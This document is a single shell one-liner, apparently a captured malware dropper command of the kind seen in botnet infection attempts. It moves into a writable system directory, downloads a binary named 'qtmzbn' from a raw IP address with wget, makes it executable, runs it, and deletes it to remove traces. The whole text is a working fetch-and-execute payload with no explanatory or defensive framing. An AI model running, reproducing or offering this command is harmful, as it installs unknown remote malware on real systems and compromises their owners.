cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.81.55/qtmzbn; chmod +x qtmzbn; ./qtmzbn; rm -rf qtmzbn
